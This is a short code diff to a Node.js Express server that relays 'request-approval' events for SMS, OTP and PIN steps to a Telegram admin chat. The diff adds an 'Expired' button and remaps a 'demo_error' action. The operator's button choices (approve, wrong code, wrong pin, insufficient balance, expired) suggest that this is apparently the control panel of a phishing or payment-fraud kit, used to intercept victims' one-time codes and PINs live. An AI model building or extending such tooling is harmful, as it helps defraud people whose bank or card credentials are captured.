@@ -92,17 +92,22 @@ app.post('/api/request-approval', async (req, res) => {
       
 
     const buttonRow =
-      step === 'otp'
+      step === 'sms'
         ? [
             { text: '✅ Approve', callback_data: `approve:${id}` },
-            { text: '❌ wrong code', callback_data: `deny:${id}` },
-            { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
-          { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
+            { text: '⏰ Expired', callback_data: `expired:${id}` },
           ]
-        : [
-            { text: '✅ Approve', callback_data: `approve:${id}` },
-            { text: '❌ wrong pin', callback_data: `deny:${id}` },
-          ];
+        : step === 'otp'
+          ? [
+              { text: '✅ Approve', callback_data: `approve:${id}` },
+              { text: '❌ wrong code', callback_data: `deny:${id}` },
+              { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
+              { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
+            ]
+          : [
+              { text: '✅ Approve', callback_data: `approve:${id}` },
+              { text: '⏰ Expired', callback_data: `expired:${id}` },
+            ];
 
     try {
       await bot.sendMessage(ADMIN_CHAT_ID, text, {
@@ -134,14 +139,16 @@ const STATUS_BY_ACTION = {
   approve: 'approved',
   deny: 'denied',
   insufficient: 'insufficient',
-  demo_error: 'demo_error'
+  expired: 'expired',
+  demo_error: 'expired'
 };
 
 const LABEL_BY_ACTION = {
   approve: 'Approve ✅',
   deny: 'wrong code ❌',
   insufficient: 'Insufficient Balance ⚠️',
-  demo_error:'wrong pin⚠️',
+  expired: 'Expired ⏰',
+  demo_error: 'Expired ⏰',
 };
 if (bot) {
   bot.on('callback_query', async (query) => {
